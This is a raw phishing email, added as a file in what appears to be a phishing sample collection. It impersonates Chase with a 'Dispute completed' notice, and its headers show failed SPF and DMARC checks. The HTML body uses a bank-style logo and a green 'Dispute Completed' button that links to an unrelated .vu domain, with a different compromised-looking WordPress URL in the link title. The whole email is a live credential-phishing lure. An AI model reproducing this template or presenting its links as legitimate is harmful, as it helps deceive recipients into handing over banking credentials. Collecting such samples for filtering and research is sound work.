@@ -1,0 +1,325 @@
+Return-Path: <Chs@secureserver.net>
+Received: from secureserver.net ([5.141.85.6])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 4gqjm5ub7mj3c5fc2a799qd70fh4222r71fc5v01
+ for zingerpie@kfcreview.com;
+ Mon, 03 Aug 2026 07:48:27 +0000 (UTC)
+Received-SPF: fail (spfCheck: domain of secureserver.net does not designate 5.141.85.6 as permitted sender) client-ip=5.141.85.6; envelope-from=Chs@secureserver.net; helo=secureserver.net;
+Authentication-Results: amazonses.com;
+ spf=fail (spfCheck: domain of secureserver.net does not designate 5.141.85.6 as permitted sender) client-ip=5.141.85.6; envelope-from=Chs@secureserver.net; helo=secureserver.net;
+ dmarc=fail header.from=secureserver.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIRklkUkE3Z3dxQkVjc0prRGtkK0psaDQ1Ynp4anFxY09nNURoOUp3a2dJdUh5MGNCV0FJTFJ6RjJ1RXhqbkgxeWM5SXBrc0hzK2I5NSszT1Q2YU1TQUI1V1IyK2dJQWdYbUFjR3laQ0c0M0N6Uk5LNWU1VWFOSWV0bWM4S2FvUFBQQkZ5bVkveURGSDhRZUw1U1J6R3JsSlBnWVZ2MlMyeERFQ29oQ3V0ck84ZW5VYkxiOGhNSlhqMDQzSmUvamkyTGMrdmNsN1BhLzZyUjlNUDFtbXFjREFoTUVac1NBWUlrMGM1OGhqQmVCeDdCNk96d1JwTmNZemNzQ083anFvaXZMV29sUmg3cnBSVTA1ZVIrbmNabGg0cXZIMHBFdWxhbE5kQk1nTG9JM2pFOVNMQ0lhMHVybVRGc1ZVOHcxVW89
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=m8c6Xhcbtj0pDquIlStzxnX3MCmnYiK3xFvojRY7xs72+LcHe0klFEH1yI5l9NPwo1I9905wj3BCLUUR05BXX0a7ZyWMKIUD3HXbkCEL6VzzipK5p8l/hu+Ud5KxovrHRP8iu4YV3jguMIFjZG7FZKNRn1lH7O0KG/1IXvAe/wc=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1785743308; v=1; bh=qXAlmQ5HubE4cdXB7fCS9FRr5MnOOwFGB39V4ZyUiAo=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Chase" <Chs@secureserver.net>
+To: zingerpie@kfcreview.com
+Subject: Dispute completed
+Date: 03 Aug 2026 12:48:26 +0500
+Message-ID: <20260803124826.D9E06F4CADF0938F@secureserver.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<DIV class=3DR1UVb style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: =
+"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFo=
+nt, Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; WIDTH: 584px; =
+VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BO=
+TTOM: 0px; POSITION: relative; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
+R: rgb(36,36,36); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2;=20
+WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style: initial; text-decoration-col=
+or: initial; font-variant-numeric: inherit; font-variant-east-asian: inheri=
+t; font-variant-alternates: inherit; font-variant-position: inherit; font-v=
+ariant-emoji: inherit; font-stretch: inherit;=20
+font-optical-sizing: inherit; font-size-adjust: inherit; font-kerning: inhe=
+rit; font-feature-settings: inherit; font-variation-settings: inherit; font=
+-language-override: inherit'>
+<TABLE class=3Dx_darkmode style=3D"FONT-SIZE: 12px; FONT-FAMILY: Verdana; W=
+IDTH: 500px; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; =
+FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS=
+: 2; LETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-c=
+aps: normal; text-decoration-style: initial; text-decoration-color: initial=
+; font-variant-numeric: inherit; font-variant-east-asian: inherit; font-var=
+iant-alternates: inherit; font-variant-position:=20
+inherit; font-variant-emoji: inherit; font-stretch: inherit; font-optical-s=
+izing: inherit; font-size-adjust: inherit; font-kerning: inherit; font-feat=
+ure-settings: inherit; font-variation-settings: inherit; font-language-over=
+ride: inherit" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ff=
+ffff border=3D0 scaled-up=3D"true">
+<TBODY>
+<TR>
+<TD style=3D"WHITE-SPACE: normal !important; PADDING-BOTTOM: 10px; PADDING-=
+TOP: 10px; PADDING-LEFT: 25px; PADDING-RIGHT: 25px">
+<IMG style=3D"BORDER-TOP: 0px; HEIGHT: 113px; BORDER-RIGHT: 0px; WIDTH: 216=
+px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: =
+0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0px; MARGIN: 0px; PA=
+DDING-RIGHT: 0px" alt=3D&#22823;&#36890;&#37504;&#34892;&#36914;&#36557;&#3=
+3521;&#22283;&#65292;&#28858;&#28040;&#36027;&#32773;&#25552;&#20379;&#3177=
+7;&#21934;&#12289;&#26377;&#22238;&#22577;&#30340;&#37504;&#34892;&#39636;&=
+#39511;=20
+src=3D"data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBw8NDQ0ND=
+Q0PDQ0NDQ8NDQ0NDw8NDQ0NFREWFhURFRUYHSggGBolHRUVITEhJSktLi8uFx8zODMvNygtLisB=
+CgoKDg0NGhAQGjYlHyUtNzM3Li0rNzU3NzIuNzU3LS83Ny03NS0tNS01KzUtNTYtOC03LS0rLS8=
+1LSswKzUtNf/AABEIAKgBLAMBIgACEQEDEQH/xAAcAAEAAQUBAQAAAAAAAAAAAAAABwEEBQYIAg=
+P/xABLEAABAwIBBQgNCgUDBQAAAAAAAQIDBBEFBgcSITEIEyJBUVWR0RQVFzVUYXF0gZKTstIWI=
+zRSU3JzlKGxMjNCYrMkhOElQ4KDo//EABoBAQADAQEBAAAAAAAAAAAAAAADBAUGAgH/xAAoEQEA=
+AgEBBgYDAQAAAAAAAAAAAQMCBBESIjFRkRMVUmJxoSEy4QX/2gAM
+%0AAwEAAhEDEQA/AJwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUKgAAAAAAAAAAAAAKAVAAAAAAAABQqA=
+AAAAAAAAAAAAAAAAAAAAAChUoBUAAAfOadkaXke1icr3I1P1Ph2yp/CYfas6wLsFp2yp/CIfas6=
+x2yp/CYfas6wLsHylnYxqOe9jGraznORrV9KnmGrikW0csb1RL2Y9rlty2RQPuAAAPhNWRRroyT=
+Rsdt0Xva1beRVPcMrJE0mPa9t7aTHI5L+VAPoAAALZ9fA1Va6eJrkWytdIxFReRUufeN6ORHNcj=
+mql0c1UVFTxKB6AAAHl7kaiucqNRNqqqIiektu2VP4TD7VnWBdgtO2dP4TD7VnWO2dP4TD7VnWB=
+dg+cE7JE0o3tkRFsqscjkvyXQ8z1UcdkklZGq60R72tv5LgfYF
+r2y%0Ap/CIfas6x2yp/CIfas6wLoFr2yp/CIfas6z1FWwvcjWTRPcuxrZGucvoRQLgAAAeJpWxt=
+c97kaxqK5znLZERONTQ8ZyxfPQ101GqxNhqIYIpf63NdbSdr2X4iSurLOfwhtvxrj8t/BBPyrxH=
+w6bpTqK/KvEfDZulOou+W2dYUPNq/TKdQabkRlk2tRKepVGVSJZrtSNnRONOR3KhuRRsryry3cm=
+jVbjbjvYgAPCQNFzuZauwWhbvFuzKtzo6e9lSNEThy2Xba7beNyG9EAbpRy9mYa2+pKWVUTxrJr=
+/ZAIyRK/GKlbdkV9U+7rJpzPRONf7U6EMr3N8b5rqOhvWSbuaqdu84pNb5xZKePS40YjXrbpX9E=
+JqA5I7m+N811HQ3rNqzbZqqyXEY5MVpH09JT2mc2W3+oeipox6l2X1r4ktxnRoAi3dDp/0aHz2P=
+3Hmi7nPvvU+YP/yxm9bojvNF57H7jyO8weJU9LilRJVVENOxaJ
+7UfPIy%0AJqu3yNbIrlTXqUDpYGF+V+F860H5uD4h8r8L50oPzcHxAQFugu/v+yg/d5KWYTvBF5=
+zUe8RJnzr4KrGt9pp4qiPsSFu+QyNlZpIrrpdq2uS3mD7wRec1HvASKYfK3HWYXh9TXSbII1Vjb=
+/xyrqY1PKqoZggPdEZT75PBhMTuBAiVFVZdSyuTgMXyN1/+ScgEQVtU+ollnlcr5ZpHSyOXje5b=
+qvSpPe56yo3+llwqV95aRVmp0Vda0zncJqfdcvQ9DC5ps3zK/BcRmqG2fiDVp6Rzk/lpGqOSVP8=
+A2InoZ4yN8k8ZlwXFYahWuY6mmWKpi2Ksd9GWNfHt9KAdhHiaVGMc9y2axqvcvI1Eup5pqhk0bJ=
+Y3I6ORjXscmtHNVLopbY4xX0dW1qXc6lma1E41WNyIByrl1lnV41VyOfI/sbfFSmpWqqMZHfg8F=
+P4nLq1rxqe2Zs8cVEVMLnsqXS6xtXoV2o17CJ2w1dNLJqZFURS
+P1XVGteir%0Aq8iHXDctsIVEVMXw/Wl9dXAi9Cu1Ac1dzHHOa5vWi+I+lPmtxt8jGLh0kaPe1qy=
+PdHoMRVtpLZ2xNp0l8tMJ53w/85T/ABF1QZR0FS7Qp6+knd9WGohkd0IoHzyUwCLCqGCigTgxN4=
+b+OWVdb5F8aqQ3ulfpWGfgT++0nsgTdK/SsM/An99oEZ4DkniGJMfJQ0j6hkbkY9zFYiNcqXtrV=
+OIyncxxzmub1oviJG3POKU1PRV7aipggc6qYrUmlZGrk3vaiOXWSz8pMP5wo/zMPWBzB3Mcc5rm=
+9aL4iXcymb+TDGy11fFvdbLeKKJ1ldBCi611aru1ehPGSF8pMP5wo/zMPWZGGVsjWvY5r2PRHNe=
+xUc1zV2KiptQD2eZHo1Fc5Ua1EVVVVsiJyqejTM6s72YexrHK1JKhrJERbaTNB66K+K6J0HurDf=
+zjHqius8Ouc+jVMucr1rXLT07lSkYutyalncnH93xcZY4cl8Er
+7Jf/AFlPs18h%0ArpJmaNqLBWIqXTf2bdf9CG3djjRTG7HKYYFGWWov4p5xKNd7d9V3qqN7d9V3=
+qqdE7y36rehBvTfqt6EK/mft+1ryj3fTndrXtVHNR7XIqKjkRyKi8qKSpkPlitTo0tXdtQiWjlV=
+NFs3iXkd+5gcsMp6ymxCeCCZrImK3RbvULrXai7VbcwyZa4imvshurX/Ig+Emtwz1FcTOMd/4r0=
+2Y6a2YjKeybgfGilWSGJ67Xxscttl1RFPsYboYnbG0Of8AdJ/TsO80k/yE/kC7pSnclThk1l0HQ=
+TR6XFpNe1bdDkD6yu5q+i4n5xD7jiZiAtz1lHS0rq6jqZo4HzuhlgWVyMbIrUcjm3XVfW1beUnH=
+trTeEwe1j6wLwFn20pvCYPax9Z9qerilvvUscmjt3t7X28tlAjPdEd5ovPY/ceQNkzk1V4rM6no=
+YkllZGsrmq9rLMRUS93LyqhPO6I7zReex+480Xc5996nzB/8Al
+jAw3cfxzwNvt4es%0Adx/HPA2+3h6zqUAcY5R5P1OF1HYtbGkU2g2TRRzX8B17LdPIp0TmE7wRe=
+c1HvEW7oLv7/soP3eSlmE7wRec1HvAbplDi8eH0dTWzL83TxOkVNmk7+lieNVsnpORW7/jGJ610=
+qnEKpVVV1o10jrrt/pRP0QlndE5T64MIidyVNWif/Ji/q71SKsFyTxGvjWaiopqiJr1jWSNOCj0=
+RFVL+RU6QOt8Go4aKlp6SFzUjp4mRN1prRqWv5V2nPefrJ5KXE0rYrbzXt03aOxtQ3U9PSll9Km=
+udzvG+bKnoTrKSZvMaRFV2GVNmoqrwUWyJ6QJjzAZT9l4e/D5XXmoF+buut1M5VVvqrdPJYlU5B=
+ze5RuwjFaarVVSJHbzUpr1071RH6uNU1OtytQ68jkR7WvaqOa5Ec1ya0VqpdFQCBc4GZiqWqlqs=
+JRk0Mz3SLTOckckLnLdWtVdTm6140sad3KMd5ud7WD4jqmSdjN
+Tntaq8TnI3V6Tx2XF9%0ArH67esDlnuUY7zc72sHxGDx/Jqvwl8aVtO+mc+7onK5qo7RtdWuaq6=
+0uh2F2XF9rH67eshTdIV8L2YbCyVj5Wunkc1jkcrWKjERVtsuv7AbHmIytmxKinpap7pZ6BY0bK=
+9bvkgk0tFFXaqorFS/IqGp7pX6Vhn4E/vtPe5oYu/Yq63BSKmaq+NXSW/ZTxulfpWGfgT++0CO8=
+mMiMQxaOSWhgSVkT0jeqyMjs5UvbhLyGa7j+OeBt9vD1kgbnCZjKHENJ7W3q2W0nI3/t+Ml7suL=
+7WP129YHMPcfxzwNvt4es6NyPoZKXC8Pppm6EsFJDFI1FRyNe1iIqXTaZHsuL7WP129Z9WPRyXa=
+qORdioqKgHo0jO19Ah87b/AI5DdzX8tsFSupNBZd43qRJtPQWVLI1UVFamvY5dhNRlGNuMz1V9V=
+hOdOWMc9iESTs0P8is/GZ7iGpdoaHnqD8vJ8RteRlfh+GRzMdi
+UU2+vR6K2N8ejZtrcZrau%0AyLKpxxidvxLF0Vc13RllsiPmEhAwHy0w3wyPof1BMs8NXV2ZHr1=
+bH9Rj+DZ6Z7N3x6vVHdGOX/fWq8rPcQ112xTYsv8AvrVeVnuIYjDcOlq5mU8DNOR/Q1ONyrxIh0=
+NUxFMTPRzF0TlflEdU9YX9Gg/Bj91C5PlRxLHFHGq3VkbWKqbFVEsfY5uebqsf1gNdy7yThxuhf=
+SSrvb0XfKeZE0lhmRFRFtxprsqcimxA+PTlbGM0+NUsjmto1qWIvBlpnMe1yfdvpJ6UMb3PMZ5r=
+qfU/5OuwByJ3PMZ5rqfUNpzc4TjmC4jHUphdW6nf81VRoz+OFVS6ol/4k2p6U4zpIAR3nvwmpr8=
+Kiio6eSok7LjkVkbbuRmg7WqelDT8xeS2IUGJzy1lFNTxuo3sa+Rtmq/fGLo+WyL0E6AAAAICz1=
+5J4jXYxv8ASUU1RF2LCzfI23bpIrrp+qG/5oqCow7Ad7qqaWOe
+KSpk3hW/OuS90RE41XiN+AHK%0A2UGSOO4hW1FZLhlSslRK6TW1OCirwW7diJZPQdHZFYC3C8Np=
+KJqJpRRIszk/rndrkd6yr6LGbAAAAc1Zxc2lfHitU7D6KWekmdv8TomorWK/W5nis6/osS7moqK=
+2PCG0+JUs8M1Cixs3xnCmgRLs0eVUTg+hDeABzJlxgePYxXzVkmF1SMVdCniVqfNQIq6Ldu3jXx=
+qpgO55jPNdT6idZ10AORe55jPNdT6idZc0Ga/G53oxMPkjRVsr5nMiY1OVbrfoRTrEAalm2yMZg=
+dFvGkktRM7famVEsjn2sjW/2on7qvGaNn7yarsQqMPdRUktS2OGZsixNujVV7VRF6CZgByL3PMZ=
+5rqfUTrHc8xnmup9ROs66AHIvc8xnmup9ROslvMizFcPWTDq+hqI6R95aeV7OBDLtcxVvqR23yp=
+4yXwAAAEdZc5E6WnV0LOFrdNTtRER3K9icviI2OjjSMrcg21cm
+/0jmQSuX51r7pE/+7Ump37mnpNb%0Au8FnLqx9b/n73HVz6IoPUX8TfvN/c3XuZVn29N0y/Ce4c=
+2dWjmq6op0ajkVyt3xVtfiSxey1lOyeJn46K/bHCxmV1FJU4zNDCxXyPWNGtT7ia15EJJyTyajw=
+2GyWfO9LzS21qv1U5GoX9HhEMM89S1t5p1TTetlVGoiIjU5E1XL+xkXamc8IwjlDa0+jivObMuc=
+gVRYoVV5UoVAAAAAAAKFQAKFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUAFQUKgAAAA=
+AAAAAAABQqAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgFQAAAAAAAAAAAAAAAAAAAAAAAAAAAsAA=
+FhYAALAABYABYWAACwAAWAACwAAWAoVKACoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
+AAAAAUAA/9k=3D" width=3D300 height=3D167=20
+data-imagetype=3D"DataUri" data-olk-copy-source=3D"MessageBody"></TD>
+<TD style=3D"WHITE-SPACE: normal !important; PADDING-BOTTOM: 10px; PADDING-=
+TOP: 10px; PADDING-LEFT: 25px; PADDING-RIGHT: 25px" align=3Dright></TD></TR=
+></TBODY></TABLE></DIV>
+<DIV class=3DR1UVb style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: =
+"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFo=
+nt, Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; WIDTH: 584px; =
+VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BO=
+TTOM: 0px; POSITION: relative; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
+R: rgb(36,36,36); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2;=20
+WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style: initial; text-decoration-col=
+or: initial; font-variant-numeric: inherit; font-variant-east-asian: inheri=
+t; font-variant-alternates: inherit; font-variant-position: inherit; font-v=
+ariant-emoji: inherit; font-stretch: inherit;=20
+font-optical-sizing: inherit; font-size-adjust: inherit; font-kerning: inhe=
+rit; font-feature-settings: inherit; font-variation-settings: inherit; font=
+-language-override: inherit'>
+<TABLE style=3D"FONT-SIZE: 12px; FONT-FAMILY: Verdana; WHITE-SPACE: normal;=
+ WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,=
+0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; font=
+-variant-ligatures: normal; font-variant-caps: normal; text-decoration-styl=
+e: initial; text-decoration-color: initial; font-variant-numeric: inherit; =
+font-variant-east-asian: inherit; font-variant-alternates: inherit; font-va=
+riant-position: inherit; font-variant-emoji:=20
+inherit; font-stretch: inherit; font-optical-sizing: inherit; font-size-adj=
+ust: inherit; font-kerning: inherit; font-feature-settings: inherit; font-v=
+ariation-settings: inherit; font-language-override: inherit" cellSpacing=3D=
+0 cellPadding=3D0 width=3D"100%" bgColor=3D#013d5b border=3D0 scaled-up=3D"=
+true">
+<TBODY>
+<TR>
+<TD class=3Dx_webfont style=3D"FONT-FAMILY: arial, helvetica, sans-serif; W=
+HITE-SPACE: normal !important; COLOR: rgb(255,255,255); PADDING-BOTTOM: 20p=
+x; TEXT-ALIGN: left; PADDING-TOP: 20px; PADDING-LEFT: 25px; PADDING-RIGHT: =
+25px">
+<H1 style=3D"FONT-SIZE: 20px; FONT-WEIGHT: normal; MARGIN: 0px; LINE-HEIGHT=
+: 26px"></H1>
+<H1 style=3D"FONT-SIZE: 20px; FONT-WEIGHT: normal; MARGIN: 0px; LINE-HEIGHT=
+: 26px">Disputed Transactions</H1></TD></TR></TBODY></TABLE></DIV>
+<DIV class=3DR1UVb style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: =
+"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFo=
+nt, Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; WIDTH: 584px; =
+VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BO=
+TTOM: 0px; POSITION: relative; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
+R: rgb(36,36,36); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2;=20
+WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style: initial; text-decoration-col=
+or: initial; font-variant-numeric: inherit; font-variant-east-asian: inheri=
+t; font-variant-alternates: inherit; font-variant-position: inherit; font-v=
+ariant-emoji: inherit; font-stretch: inherit;=20
+font-optical-sizing: inherit; font-size-adjust: inherit; font-kerning: inhe=
+rit; font-feature-settings: inherit; font-variation-settings: inherit; font=
+-language-override: inherit'>
+<TABLE class=3Dx_darkmode style=3D"FONT-SIZE: 12px; FONT-FAMILY: Verdana; W=
+HITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 4=
+00; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
+ACING: normal; font-variant-ligatures: normal; font-variant-caps: normal; t=
+ext-decoration-style: initial; text-decoration-color: initial; font-variant=
+-numeric: inherit; font-variant-east-asian: inherit; font-variant-alternate=
+s: inherit; font-variant-position: inherit;=20
+font-variant-emoji: inherit; font-stretch: inherit; font-optical-sizing: in=
+herit; font-size-adjust: inherit; font-kerning: inherit; font-feature-setti=
+ngs: inherit; font-variation-settings: inherit; font-language-override: inh=
+erit" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ffffff bord=
+er=3D0 scaled-up=3D"true">
+<TBODY>
+<TR>
+<TD class=3Dx_webfont style=3D"FONT-SIZE: 16px; FONT-FAMILY: arial, helveti=
+ca, sans-serif; WHITE-SPACE: normal !important; COLOR: rgb(20,20,20); PADDI=
+NG-BOTTOM: 20px; TEXT-ALIGN: left; PADDING-TOP: 20px; PADDING-LEFT: 25px; L=
+INE-HEIGHT: 22px; PADDING-RIGHT: 25px">
+<P style=3D"MARGIN: 0px 0px 20px">Dear zingerpie,<BR><BR><STRONG><FONT size=
+=3D3>Your chargeback is complete</FONT></STRONG><BR><BR>Disputed transactio=
+ns are now available online for review. Please review your&nbsp;claim now.<=
+/P></TD></TR></TBODY></TABLE></DIV>
+<DIV class=3DR1UVb style=3D'FONT-SIZE: 15px; BORDER-TOP: 0px; FONT-FAMILY: =
+"Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFo=
+nt, Roboto, "Helvetica Neue", sans-serif; BORDER-RIGHT: 0px; WIDTH: 584px; =
+VERTICAL-ALIGN: baseline; WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BO=
+TTOM: 0px; POSITION: relative; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLO=
+R: rgb(36,36,36); PADDING-BOTTOM: 0px; FONT-STYLE: normal; PADDING-TOP: 0px=
+; PADDING-LEFT: 0px; BORDER-LEFT: 0px; ORPHANS: 2;=20
+WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 0px; BACKGRO=
+UND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: norm=
+al; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decorat=
+ion-thickness: initial; text-decoration-style: initial; text-decoration-col=
+or: initial; font-variant-numeric: inherit; font-variant-east-asian: inheri=
+t; font-variant-alternates: inherit; font-variant-position: inherit; font-v=
+ariant-emoji: inherit; font-stretch: inherit;=20
+font-optical-sizing: inherit; font-size-adjust: inherit; font-kerning: inhe=
+rit; font-feature-settings: inherit; font-variation-settings: inherit; font=
+-language-override: inherit'>
+<TABLE class=3Dx_darkmode style=3D"FONT-SIZE: 12px; FONT-FAMILY: Verdana; W=
+HITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 4=
+00; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SP=
+ACING: normal; font-variant-ligatures: normal; font-variant-caps: normal; t=
+ext-decoration-style: initial; text-decoration-color: initial; font-variant=
+-numeric: inherit; font-variant-east-asian: inherit; font-variant-alternate=
+s: inherit; font-variant-position: inherit;=20
+font-variant-emoji: inherit; font-stretch: inherit; font-optical-sizing: in=
+herit; font-size-adjust: inherit; font-kerning: inherit; font-feature-setti=
+ngs: inherit; font-variation-settings: inherit; font-language-override: inh=
+erit" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ffffff bord=
+er=3D0 scaled-up=3D"true">
+<TBODY>
+<TR>
+<TD style=3D"FONT-SIZE: 0px; WHITE-SPACE: normal !important; PADDING-BOTTOM=
+: 10px; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 25px; PADDING-R=
+IGHT: 25px">
+<DIV class=3Dx_cssbutton style=3D"MAX-WIDTH: 300px; BORDER-TOP: 0px; BORDER=
+-RIGHT: 0px; WIDTH: 300px; VERTICAL-ALIGN: top; BORDER-BOTTOM: 0px; COLOR: =
+; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; BORDER-LEFT: 0p=
+x; MARGIN: 0px; DISPLAY: inline-block; PADDING-RIGHT: 0px">
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"HEIGHT: 48px; WHITE-SPACE: normal !important">
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"WHITE-SPACE: normal !important; TEXT-ALIGN: center" bgColor=3D=
+#25810e height=3D48>
+<A title=3Dhttps://dsmtransformandovidas.com/wp-includes/wx.htm class=3Dx_w=
+ebfont style=3D"TEXT-DECORATION: none; BORDER-TOP: medium none; BORDER-RIGH=
+T: medium none; WIDTH: 300px; VERTICAL-ALIGN: baseline; MIN-WIDTH: 300px; B=
+ORDER-BOTTOM: medium none; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TE=
+XT-ALIGN: center; PADDING-TOP: 0px; FONT: 20px/48px arial, helvetica, sans-=
+serif; PADDING-LEFT: 0px; BORDER-LEFT: medium none; MARGIN: 0px; DISPLAY: i=
+nline-block; PADDING-RIGHT: 0px; BACKGROUND-COLOR:=20
+rgb(37,129,14); border-image: none" href=3D"https://online.vernado.vu/mathi=
+/ib.html" rel=3D"noopener noreferrer" target=3D_blank data-auth=3D"NotAppli=
+cable" data-linkindex=3D"0"><STRONG style=3D"FONT-WEIGHT: normal; COLOR: rg=
+b(255,255,255)">Dispute Completed</STRONG></A></TD></TR></TBODY></TABLE></T=
+D></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></DIV>
+<SPAN style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (Wes=
+t European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", =
+sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; F=
+LOAT: none; FONT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORP=
+HANS: 2; WIDOWS: 2; DISPLAY: inline !important; LETTER-SPACING: normal; BAC=
+KGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-ligatures: =
+normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial'>&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp; Date&nbsp;3.8.2026 12:48:26</SPAN>
+ <BR style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West=
+ European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", s=
+ans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FO=
+NT-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOW=
+S: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDE=
+NT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
+-text-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial'>
+<BR style=3D'FONT-SIZE: 15px; FONT-FAMILY: "Segoe UI", "Segoe UI Web (West =
+European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sa=
+ns-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FON=
+T-WEIGHT: 400; COLOR: rgb(36,36,36); FONT-STYLE: normal; ORPHANS: 2; WIDOWS=
+: 2; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDEN=
+T: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
+text-stroke-width: 0px; text-decoration-thickness:=20
+initial; text-decoration-style: initial; text-decoration-color: initial'>
